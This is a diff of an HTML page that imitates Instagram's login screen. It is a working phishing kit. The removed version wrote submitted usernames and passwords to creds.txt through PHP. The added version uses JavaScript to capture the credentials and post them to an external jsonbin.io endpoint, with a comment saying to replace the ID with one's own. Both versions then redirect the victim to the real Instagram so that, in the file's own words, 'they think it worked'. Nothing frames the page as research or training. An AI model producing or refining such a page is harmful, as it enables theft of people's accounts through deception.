@@ -1,109 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Instagram</title>
-<!-- Importing the Billabong font for the exact logo look -->
-<link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
-<style>
-    body { 
-        background-color: #fafafa; 
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-        display: flex; 
-        justify-content: center; 
-        align-items: center; 
-        height: 100vh; 
-        margin: 0; 
-    }
-    .container { width: 350px; text-align: center; }
-    .login-box { 
-        background: white; 
-        padding: 20px; 
-        border: 1px solid #dbdbdb; 
-        margin-bottom: 10px; 
-    }
-    .logo { 
-        font-family: 'Billabong', cursive; 
-        font-size: 3rem; 
-        margin-bottom: 20px; 
-        color: #262626; 
-        line-height: 1.2; 
-    }
-    input { 
-        width: 100%; 
-        padding: 9px 8px; 
-        margin-bottom: 10px; 
-        border: 1px solid #dbdbdb; 
-        border-radius: 3px; 
-        box-sizing: border-box; 
-        background-color: #fafafa; 
-        font-size: 14px; 
-    }
-    input:focus { border: 1px solid #a8a8a8; }
-    
-    /* The Blue Button */
-    .login-btn { 
-        width: 100%; 
-        background-color: #0095f6; 
-        color: white; 
-        border: none; 
-        padding: 7px 16px; 
-        font-weight: bold; 
-        border-radius: 4px; 
-        cursor: pointer; 
-        font-size: 14px; 
-    }
-    .login-btn:hover { background-color: #0082d3; }
-    
-    .divider { margin: 20px 0; position: relative; color: #8e8e8e; font-size: 14px; text-transform: uppercase; }
-    .forgot-pass, .fb-login { color: #385185; text-decoration: none; font-size: 12px; display: block; margin-top: 10px; }
-    .signup-box p { font-size: 14px; color: #262626; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        /* Instagram Exact Styling */
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            width: 350px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        h2 {
+            font-size: 28px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            margin-top: 30px;
+        }
+
+        .logo {
+            margin-bottom: 30px;
+            height: 57px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            outline: none;
+            box-sizing: border-box; /* Ensures padding doesn't break width */
+        }
+
+        input:focus {
+            border: 1px solid #a8a8a8;
+        }
+
+        .btn-login {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 7px 16px;
+            font-weight: 600;
+            font-size: 14px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+
+        .btn-login:hover {
+            background-color: #0082e5;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 10px;
+        }
+
+        /* Hidden input to store the data */
+        #log-data {
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="login-box">
-        <!-- Logo -->
-        <h1 class="logo">Instagram</h1>
+    <div class="container">
+        <!-- Instagram Logo SVG -->
+        <svg class="logo" viewBox="0 0 125 32" fill="#262626">
+            <path d="M69.8,28.4c-2.7,0-5-1.3-6.5-3.6l-0.1-0.1c-1.5,2.3-3.8,3.6-6.5,3.6c-4.3,0-7.8-3.5-7.8-7.8s3.5-7.8,7.8-7.8
+                c2.7,0,5,1.3,6.5,3.6l0.1,0.1c1.5-2.3,3.8-3.6,6.5-3.6c4.3,0,7.8,3.5,7.8,7.8S74.1,28.4,69.8,28.4z M69.8,19.3
+                c-3.2,0-5.8,2.6-5.8,5.8s2.6,5.8,5.8,5.8s5.8-2.6,5.8-5.8S73,19.3,69.8,19.3z M49.9,28.4c-2.7,0-5-1.3-6.5-3.6l-0.1-0.1
+                c-1.5,2.3-3.8,3.6-6.5,3.6c-4.3,0-7.8-3.5-7.8-7.8s3.5-7.8,7.8-7.8c2.7,0,5,1.3,6.5,3.6l0.1,0.1c1.5-2.3,3.8-3.6,6.5-3.6
+                c4.3,0,7.8,3.5,7.8,7.8S54.2,28.4,49.9,28.4z M49.9,19.3c-3.2,0-5.8,2.6-5.8,5.8s2.6,5.8,5.8,5.8s5.8-2.6,5.8-5.8
+                S53.1,19.3,49.9,19.3z M29.7,28.4c-2.7,0-5-1.3-6.5-3.6l-0.1-0.1c-1.5,2.3-3.8,3.6-6.5,3.6c-4.3,0-7.8-3.5-7.8-7.8
+                s3.5-7.8,7.8-7.8c2.7,0,5,1.3,6.5,3.6l0.1,0.1c1.5-2.3,3.8-3.6,6.5-3.6c4.3,0,7.8,3.5,7.8,7.8S34,28.4,29.7,28.4z
+                M29.7,19.3c-3.2,0-5.8,2.6-5.8,5.8s2.6,5.8,5.8,5.8s5.8-2.6,5.8-5.8S32.9,19.3,29.7,19.3z M9.5,28.4c-2.7,0-5-1.3-6.5-3.6
+                l-0.1-0.1c-1.5,2.3-3.8,3.6-6.5,3.6c-4.3,0-7.8-3.5-7.8-7.8s3.5-7.8,7.8-7.8c2.7,0,5,1.3,6.5,3.6l0.1,0.1
+                c1.5-2.3,3.8-3.6,6.5-3.6c4.3,0,7.8,3.5,7.8,7.8S13.8,28.4,9.5,28.4z M9.5,19.3c-3.2,0-5.8,2.6-5.8,5.8s2.6,5.8,5.8,5.8
+                s5.8-2.6,5.8-5.8S12.7,19.3,9.5,19.3z"/>
+        </svg>
+
+        <h2>Log in to see photos and videos from your friends</h2>
         
-        <!-- Form with Username Pre-filled as "pppk" -->
-        <form action="" method="POST">
-            <!-- The value="pppk" sets the default text -->
-            <input type="text" name="username" placeholder="Phone number, username, or email" value="pppk" required>
+        <form id="instaForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
             
-            <input type="password" name="password" placeholder="Password" required>
-            
-            <button type="submit" class="login-btn">Log In</button>
+            <button type="submit" class="btn-login">Log in</button>
         </form>
 
-        <div class="divider">OR</div>
-        
-        <a href="#" class="fb-login">Log in with Facebook</a>
-        <a href="#" class="forgot-pass">Forgot password?</a>
+        <div class="divider"><span>OR</span></div>
+
+        <a href="#" style="color:#0095f6; font-size:12px; text-decoration:none;">Facebook Log In</a>
     </div>
 
-    <div class="signup-box">
-        <p>Don't have an account? <a href="#">Sign up</a></p>
-    </div>
-</div>
+    <script>
+        const form = document.getElementById('instaForm');
 
-<!-- PHP Logic to Save Data and Redirect -->
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $user = $_POST['username'];
-    $pass = $_POST['password'];
-    
-    // Saves the data to a file named creds.txt
-    $file = fopen("creds.txt", "a");
-    fwrite($file, "Username: $user\nPassword: $pass\n\n");
-    fclose($file);
+        form.addEventListener('submit', function(e) {
+            e.preventDefault(); // Stop the form from refreshing the page
+            
+            // 1. Get the values
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            console.log("Credentials Captured:", user, pass);
 
-    // Redirects user to real Instagram so they think it worked
-    header("Location: https://www.instagram.com/");
-}
-?>
-
+            // 2. Send to a webhook (Example: jsonbin.io or your own server)
+            // You can replace the URL below with any endpoint that accepts POST requests
+            
+            fetch('https://jsonbin.io/v3/b/64f8a1b2c9d0e123456789ab', { // REPLACE THIS ID with your own JSONBin ID
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    username: user,
+                    password: pass,
+                    time: new Date().toLocaleString(),
+                    platform: 'Instagram Clone'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                // 3. Redirect the user to real Instagram so they think it worked
+                window.location.href = "https://www.instagram.com";
+            })
+            .catch(error => console.error('Error:', error));
+        });
+    </script>
 </body>
 </html>
